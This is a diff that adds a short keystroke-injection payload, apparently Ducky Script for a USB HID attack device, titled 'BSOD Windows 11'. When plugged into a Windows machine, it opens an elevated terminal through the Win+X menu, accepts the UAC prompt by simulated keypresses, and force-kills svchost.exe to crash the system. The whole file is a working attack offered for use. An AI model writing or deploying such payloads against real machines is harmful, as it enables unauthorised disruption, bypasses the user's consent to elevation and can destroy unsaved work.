@@ -1,0 +1,17 @@
+REM Author: ravindu644
+REM Github: https://github.com/ravindu644
+REM Title: BSOD Windows 11
+REM Description: Kills svchost.exe to temporary crash the Windows system
+REM Target: Windows based
+REM VERSION: 1.0
+
+GUI x
+DELAY 200
+STRING A
+DELAY 1000
+LEFT
+DELAY 100
+ENTER
+DELAY 1300
+STRING taskkill /F /IM svchost.exe
+ENTER
